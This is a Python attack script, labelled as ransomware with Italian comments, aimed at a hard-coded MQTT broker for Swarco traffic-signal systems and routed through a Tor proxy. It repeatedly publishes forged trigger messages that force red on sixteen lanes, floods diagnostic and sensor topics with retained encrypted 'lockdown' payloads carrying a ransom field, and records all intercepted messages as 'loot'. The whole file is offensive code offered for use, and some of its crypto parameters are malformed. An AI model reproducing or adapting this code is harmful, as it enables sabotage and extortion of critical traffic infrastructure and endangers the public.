#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.4-NUCLEAR | TRUSTEDF57 | FORZA SOVRASCRIZIONE

import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket
import socks
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

class SWARCORansomware:
    def __init__(self):
        self.target_ip = "166.159.129.5"
        self.port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "fucknomoneySUCCHIALO"
        
        self.aes_key = b'TRUSTEDF57_SWARCO_MIL_K3Y_32BYT3S!!'
        self.iv = b'SWARCO_SEMAFORI_16'
        
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        
        self.mqtt_client = mqtt.Client(
            client_id="TRUSTEDF57_NUCLEAR", 
            clean_session=False,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION1
        )
        
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        
        self.nuclear_active = True
        self.lockdown_active = False
    
    def aes_encrypt_all(self, data):
        cipher = Cipher(algorithms.AES(self.aes_key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data.encode() + b' ' * (16 - len(data.encode()) % 16)
        return base64.b64encode(encryptor.update(padded) + encryptor.finalize()).decode()
    
    def nuclear_lockdown(self):
        """💥 NUCLEAR LOCKDOWN - AES su TUTTO"""
        if self.lockdown_active:
            return
            
        self.lockdown_active = True
        self.nuclear_active = False
        
        print("☢️ NUCLEAR LOCKDOWN ATTIVO - TUTTO AES!")
        
        lockdown_payload = self.aes_encrypt_all(json.dumps({
            "TRUSTEDF57_NUCLEAR": True,
            "STATUS": "PERMANENT_LOCKDOWN",
            "BTC": self.btc_addr,
            "AES_KEY_HEX": self.aes_key.hex(),
            "ALL_SYSTEMS": "HALTED"
        }))
        
        # FLOOD CRITICO
        nuclear_topics = [
            "traffic-triggers-output",
            "traffic-statistic-output/#",
            "plc-diagnostics", 
            "comhub-diagnostics",
            "sensor-traffic-objects/#"
        ]
        
        for topic in nuclear_topics:
            for i in range(10):  # 10x retained
                self.mqtt_client.publish(topic, lockdown_payload, qos=2, retain=True)
            print(f"☢️ NUCLEAR → {topic}")
    
    def nuclear_chaos(self):
        """FORZA struttura Swarco + TRUSTEDF57"""
        # 🔄 COPIA ESATTA struttura Swarco + FORCE_RED
        nuclear_payload = {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S+00:00"),
            "TRUSTEDF57_NUCLEAR": True,
            "NUCLEAR_HALT": True,
            "trigger_outputs": []
        }
        
        # Forza ROSSI su lane 1-16 (copia loro struttura)
        for i in range(1, 17):
            nuclear_payload["trigger_outputs"].append({
                "traffic_triggers": [{
                    "associated_lane": f"lane{i}",
                    "associated_sensor": f"sensor{(i-1)%3+1}",
                    "associated_zone": f"zone{i}",
                    "reference_name": f"trigger_{i}_{i-1}",
                    "FORCE_RED": True,  # ← FORZATO
                    "TRUSTEDF57": True,
                    "HALT": True
                }],
                "trigger_output": 31 + i
            })
        
        payload_json = json.dumps(nuclear_payload)
        self.mqtt_client.publish("traffic-triggers-output", payload_json, qos=2, retain=True)
        print(f"☢️ NUCLEAR FORCE_RED → {len(nuclear_payload['trigger_outputs'])} lanes")
        
        # Display nuclear
        self.mqtt_client.publish("traffic-statistic-output/sensor1", 
            json.dumps({"☢️": "NUCLEAR_ACTIVE", "BTC": self.btc_addr}), qos=2, retain=True)
    
    def on_connect(self, client, userdata, flags, rc, properties=None):
        print(f"☢️ NUCLEAR CONNECTED rc={rc}")
        client.subscribe("#", qos=2)
        
        # IMMEDIATE NUCLEAR
        threading.Thread(target=self.nuclear_loop, daemon=True).start()
        threading.Thread(target=self.nuclear_monitor, daemon=True).start()
    
    def on_message(self, client, userdata, msg, properties=None):
        try:
            data = msg.payload.decode(errors='ignore')
            print(f"[NUCLEAR LOOT] {msg.topic}: {data[:50]}...")
            
            # TRIGGER NUCLEAR su qualsiasi traffico
            if "traffic-triggers" in msg.topic and "TRUSTEDF57" not in data:
                print("🚨 TRAFFIC TRIGGERS DETECTED → NUCLEAR LOCK!")
                self.nuclear_lockdown()
            
            # Salva loot
            enc_loot = self.aes_encrypt_all(f"{msg.topic}|{data}")
            with open("swarco_nuclear.aes", "ab") as f:
                f.write(f"{enc_loot}\n".encode())
        except:
            pass
    
    def nuclear_loop(self):
        """Spam nuclear ogni 0.2s"""
        while self.nuclear_active:
            self.nuclear_chaos()
            time.sleep(0.2)
    
    def nuclear_monitor(self):
        """Monitor + lockdown dopo 60s"""
        time.sleep(60)
        print("⏰ 60s elapsed → FORCE NUCLEAR LOCKDOWN")
        self.nuclear_lockdown()
    
    def run(self):
        while True:
            try:
                self.mqtt_client.connect(self.target_ip, self.port, 60)
                self.mqtt_client.loop_forever()
            except Exception as e:
                print(f"🔄 Nuclear reconnect: {e}")
                time.sleep(2)

if __name__ == "__main__":
    print("☢️ TRUSTEDF57 v2.4-NUCLEAR | FORCE_RED + AES PERMANENTE")
    rw = SWARCORansomware()
    rw.run()
